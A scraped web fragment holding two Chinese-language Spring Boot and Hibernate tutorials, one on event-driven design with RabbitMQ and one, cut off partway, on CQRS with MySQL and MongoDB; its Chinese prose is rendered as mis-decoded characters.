<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.io.Serializable;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderCreatedEvent</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;
    <span class="hljs-keyword">private</span> Long orderId;
    <span class="hljs-keyword">private</span> String product;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> quantity;
    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> price;

    <span class="hljs-comment">// Getters and Setters</span>
    <span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getOrderId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> orderId;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setOrderId</span><span class="hljs-params">(Long orderId)</span> {
        <span class="hljs-built_in">this</span>.orderId = orderId;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getProduct</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> product;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setProduct</span><span class="hljs-params">(String product)</span> {
        <span class="hljs-built_in">this</span>.product = product;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getQuantity</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> quantity;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setQuantity</span><span class="hljs-params">(<span class="hljs-type">int</span> quantity)</span> {
        <span class="hljs-built_in">this</span>.quantity = quantity;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getPrice</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> price;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setPrice</span><span class="hljs-params">(<span class="hljs-type">double</span> price)</span> {
        <span class="hljs-built_in">this</span>.price = price;
    }
}
</code></pre>
<h4 data-id="heading-9"><code>OrderEventListener.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.amqp.rabbit.annotation.RabbitListener;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;

<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderEventListener</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> OrderRepository orderRepository;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">OrderEventListener</span><span class="hljs-params">(OrderRepository orderRepository)</span> {
        <span class="hljs-built_in">this</span>.orderRepository = orderRepository;
    }

    <span class="hljs-meta">@RabbitListener(queues = "orderQueue")</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleOrderCreatedEvent</span><span class="hljs-params">(OrderCreatedEvent event)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Order</span>();
        order.setId(event.getOrderId());
        order.setProduct(event.getProduct());
        order.setQuantity(event.getQuantity());
        order.setPrice(event.getPrice());
        orderRepository.save(order);
    }
}
</code></pre>
<h3 data-id="heading-10">6. å‘å¸ƒäº‹ä»¶</h3>
<h4 data-id="heading-11"><code>OrderService.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.amqp.rabbit.core.RabbitTemplate;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;
<span class="hljs-keyword">import</span> org.springframework.transaction.annotation.Transactional;

<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> RabbitTemplate rabbitTemplate;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> OrderRepository orderRepository;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">OrderService</span><span class="hljs-params">(RabbitTemplate rabbitTemplate, OrderRepository orderRepository)</span> {
        <span class="hljs-built_in">this</span>.rabbitTemplate = rabbitTemplate;
        <span class="hljs-built_in">this</span>.orderRepository = orderRepository;
    }

    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">createOrder</span><span class="hljs-params">(Order order)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">savedOrder</span> <span class="hljs-operator">=</span> orderRepository.save(order);

        <span class="hljs-comment">// Publish event</span>
        <span class="hljs-type">OrderCreatedEvent</span> <span class="hljs-variable">event</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderCreatedEvent</span>();
        event.setOrderId(savedOrder.getId());
        event.setProduct(savedOrder.getProduct());
        event.setQuantity(savedOrder.getQuantity());
        event.setPrice(savedOrder.getPrice());
        rabbitTemplate.convertAndSend(<span class="hljs-string">"orderQueue"</span>, event);

        <span class="hljs-keyword">return</span> savedOrder;
    }
}
</code></pre>
<h3 data-id="heading-12">7. åˆ›å»ºæ§åˆ¶å™¨</h3>
<h4 data-id="heading-13"><code>OrderController.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.http.ResponseEntity;
<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;

<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/orders")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderController</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderService orderService;

    <span class="hljs-meta">@PostMapping</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;Order&gt; <span class="hljs-title function_">createOrder</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> Order order)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">createdOrder</span> <span class="hljs-operator">=</span> orderService.createOrder(order);
        <span class="hljs-keyword">return</span> ResponseEntity.ok(createdOrder);
    }

    <span class="hljs-meta">@GetMapping("/{id}")</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;Order&gt; <span class="hljs-title function_">getOrderById</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long id)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> orderService.getOrderById(id);
        <span class="hljs-keyword">return</span> ResponseEntity.ok(order);
    }

    <span class="hljs-meta">@GetMapping</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;List&lt;Order&gt;&gt; <span class="hljs-title function_">getAllOrders</span><span class="hljs-params">()</span> {
        List&lt;Order&gt; orders = orderService.getAllOrders();
        <span class="hljs-keyword">return</span> ResponseEntity.ok(orders);
    }

    <span class="hljs-meta">@PutMapping("/{id}")</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;Order&gt; <span class="hljs-title function_">updateOrder</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long id, <span class="hljs-meta">@RequestBody</span> Order order)</span> {
        order.setId(id); <span class="hljs-comment">// Ensure the order ID is set correctly</span>
        <span class="hljs-type">Order</span> <span class="hljs-variable">updatedOrder</span> <span class="hljs-operator">=</span> orderService.updateOrder(order);
        <span class="hljs-keyword">return</span> ResponseEntity.ok(updatedOrder);
    }

    <span class="hljs-meta">@DeleteMapping("/{id}")</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;Void&gt; <span class="hljs-title function_">deleteOrder</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long id)</span> {
        orderService.deleteOrder(id);
        <span class="hljs-keyword">return</span> ResponseEntity.noContent().build();
    }
}
</code></pre>
<h3 data-id="heading-14">8. è¿è¡Œåº”ç”¨</h3>
<ol>
<li><strong>å¯åŠ¨RabbitMQ</strong>ï¼šç¡®ä¿ä½ çš„RabbitMQæœåŠ¡å™¨è¿è¡Œåœ¨<code>localhost:5672</code>ã€‚</li>
<li><strong>å¯åŠ¨Spring Bootåº”ç”¨</strong>ï¼šè¿è¡ŒSpring Bootåº”ç”¨ç¨‹åºã€‚</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">mvn spring-boot:run
</code></pre>
<h3 data-id="heading-15">9. è®¿é—®API</h3>
<p>é€šè¿‡ä»¥ä¸‹APIè®¿é—®<code>Order</code>æ•°æ®ï¼š</p>
<ul>
<li><code>POST /orders</code>ï¼šåˆ›å»ºOrderã€‚</li>
<li><code>GET /orders/{id}</code>ï¼šæŒ‰IDè·å–Orderã€‚</li>
<li><code>GET /orders</code>ï¼šè·å–æ‰€æœ‰Ordersã€‚</li>
<li><code>PUT /orders/{id}</code>ï¼šæ›´æ–°Orderã€‚</li>
<li><code>DELETE /orders/{id}</code>ï¼šåˆ é™¤Orderã€‚</li>
</ul>
<h3 data-id="heading-16">æ€»ç»“</h3>
<p>é€šè¿‡ä¸Šè¿°æ­¥éª¤ï¼Œæˆ‘ä»¬å±•ç¤ºäº†å¦‚ä½•åœ¨äº‹ä»¶é©±åŠ¨æ¶æ„ä¸­ä½¿ç”¨Hibernateï¼ŒåŒ…æ‹¬é…ç½®Hibernateå’Œæ•°æ®æºã€å®šä¹‰å®ä½“å’ŒDAOå±‚ã€é…ç½®RabbitMQã€åˆ›å»ºäº‹ä»¶å’Œäº‹ä»¶å¤„ç†å™¨ã€å‘å¸ƒå’Œå¤„ç†äº‹ä»¶ï¼Œä»¥åŠä½¿ç”¨æ§åˆ¶å™¨è®¿é—®APIã€‚åœ¨äº‹ä»¶é©±åŠ¨æ¶æ„ä¸­ï¼Œäº‹ä»¶è§¦å‘å™¨å’Œäº‹ä»¶å¤„ç†å™¨ä¹‹é—´çš„æ¾æ•£è€¦åˆå¯ä»¥æé«˜ç³»ç»Ÿçš„å¯æ‰©å±•æ€§å’Œçµæ´»æ€§ï¼ŒåŒæ—¶é€šè¿‡ä½¿ç”¨Hibernateç¡®ä¿æ•°æ®æŒä¹…æ€§ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hibernateï¼ˆ74ï¼‰å¦‚ä½•åœ¨CQRSæ¶æ„ä¸­ä½¿ç”¨Hibernateï¼Ÿ]]></title>    <link>https://juejin.cn/post/7600787795477872686</link>    <guid>https://juejin.cn/post/7600787795477872686</guid>    <pubDate>2026-01-30T11:50:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600787795477872686" data-draft-id="7600990891206983707" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hibernateï¼ˆ74ï¼‰å¦‚ä½•åœ¨CQRSæ¶æ„ä¸­ä½¿ç”¨Hibernateï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-30T11:50:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernateï¼ˆ74ï¼‰å¦‚ä½•åœ¨CQRSæ¶æ„ä¸­ä½¿ç”¨Hibernateï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T11:50:55.000Z" title="Fri Jan 30 2026 11:50:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨CQRSï¼ˆCommand Query Responsibility Segregationï¼‰æ¶æ„ä¸­ï¼Œè¯»æ“ä½œï¼ˆQueryï¼‰å’Œå†™æ“ä½œï¼ˆCommandï¼‰è¢«åˆ†ç¦»åˆ°ä¸åŒçš„æ¨¡å‹ä¸­ã€‚è¿™æ ·å¯ä»¥ä¼˜åŒ–è¯»å–å’Œå†™å…¥çš„æ€§èƒ½ï¼Œå¹¶ä¸”å…è®¸ä½¿ç”¨ä¸åŒçš„å­˜å‚¨æŠ€æœ¯æ¥å®ç°è¯»å–å’Œå†™å…¥æ¨¡å‹ã€‚Hibernateé€šå¸¸ç”¨äºå¤„ç†å†™æ“ä½œï¼Œå› ä¸ºå®ƒæ“…é•¿å¤„ç†å¤æ‚çš„äº¤æ˜“å’Œå…³ç³»æ•°æ®ã€‚</p>
<p>ä¸‹é¢æˆ‘ä»¬å°†å±•ç¤ºå¦‚ä½•åœ¨Spring Booté¡¹ç›®ä¸­ç»“åˆHibernateå®ç°CQRSæ¶æ„ã€‚</p>
<h3 data-id="heading-0">1. é¡¹ç›®ä¾èµ–</h3>
<p>åœ¨<code>pom.xml</code>ä¸­æ·»åŠ å¿…è¦çš„ä¾èµ–ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- Spring Boot Starter Data JPA --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-jpa<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- MySQL Connector --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.0.26<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- HikariCP for Connection Pooling --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.zaxxer<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>HikariCP<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- Spring Boot Starter Web --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- Spring Boot Starter Data MongoDB (for Query Model) --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-mongodb<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- Lombok --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.18.20<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>provided<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>
</code></pre>
<h3 data-id="heading-1">2. é…ç½®æ•°æ®æºå’ŒHibernateå±æ€§</h3>
<p>åœ¨<code>application.properties</code>ä¸­é…ç½®MySQLå’ŒMongoDBæ•°æ®æºï¼š</p>
<pre><code class="hljs language-properties" lang="properties"># MySQL Database Configuration (Command Model)
spring.datasource.url=jdbc:mysql://localhost:3306/mydatabase
spring.datasource.username=root
spring.datasource.password=rootpassword
spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver

spring.jpa.hibernate.ddl-auto=update
spring.jpa.show-sql=true
spring.jpa.properties.hibernate.dialect=org.hibernate.dialect.MySQLDialect

# MongoDB Configuration (Query Model)
spring.data.mongodb.host=localhost
spring.data.mongodb.port=27017
spring.data.mongodb.database=myquerydatabase
</code></pre>
<h3 data-id="heading-2">3. å®šä¹‰å†™æ¨¡å‹ï¼ˆCommand Modelï¼‰</h3>
<h4 data-id="heading-3"><code>Order.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-keyword">import</span> javax.persistence.Entity;
<span class="hljs-keyword">import</span> javax.persistence.GeneratedValue;
<span class="hljs-keyword">import</span> javax.persistence.GenerationType;
<span class="hljs-keyword">import</span> javax.persistence.Id;
<span class="hljs-keyword">import</span> javax.persistence.Table;

<span class="hljs-meta">@Data</span>
<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "orders")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Order</span> {

    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;
    <span class="hljs-keyword">private</span> String product;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> quantity;
    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> price;
}
</code></pre>
<h4 data-id="heading-4"><code>OrderRepository.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.data.jpa.repository.JpaRepository;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">OrderRepository</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">JpaRepository</span>&lt;Order, Long&gt; {
}
</code></pre>
<h3 data-id="heading-5">4. å®šä¹‰è¯»æ¨¡å‹ï¼ˆQuery Modelï¼‰</h3>
<h4 data-id="heading-6"><code>OrderView.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-keyword">import</span> org.springframework.data.mongodb.core.mapping.Document;
<span class="hljs-keyword">import</span> org.springframework.data.annotation.Id;

<span class="hljs-meta">@Data</span>
<span class="hljs-meta">@Document(collection = "orders")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderView</span> {

    <span class="hljs-meta">@Id</span>
    <span class="hljs-keyword">private</span> String id;
    <span class="hljs-keyword">private</span> String product;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> quantity;
    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> price;
}
</code></pre>
<h4 data-id="heading-7"><code>OrderViewRepository.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.data.mongodb.repository.MongoRepository;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">OrderViewRepository</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">MongoRepository</span>&lt;OrderView, String&gt; {
}
</code></pre>
<h3 data-id="heading-8">5. åˆ›å»ºæœåŠ¡å±‚</h3>
<h4 data-id="heading-9">å†™æ“ä½œæœåŠ¡ï¼ˆCommand Serviceï¼‰</h4>
<h5 data-id="heading-10"><code>OrderCommandService.java</code></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;
<span class="hljs-keyword">import</span> org.springframework.transaction.annotation.Transactional;

<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderCommandService</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderRepository orderRepository;

    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">createOrder</span><span class="hljs-params">(Order order)</span> {
        <span class="hljs-keyword">return</span> orderRepository.save(order);
    }

    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">updateOrder</span><span class="hljs-params">(Order order)</span> {
        <span class="hljs-keyword">return</span> orderRepository.save(order);
    }

    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteOrder</span><span class="hljs-params">(Long id)</span> {
        orderRepository.deleteById(id);
    }
}
</code></pre>
<h4 data-id="heading-11">è¯»æ“ä½œæœåŠ¡ï¼ˆQuery Serviceï¼‰</h4>
<h5 data-id="heading-12"><code>OrderQueryService.java</code></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;

<span class="hljs-keyword">import</span> java.util.List;
<span class="hljs-keyword">import</span> java.util.Optional;

<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderQueryService</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderViewRepository orderViewRepository;

    <span class="hljs-keyword">public</span> List&lt;OrderView&gt; <span class="hljs-title function_">getAllOrders</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> orderViewRepository.findAll();
    }

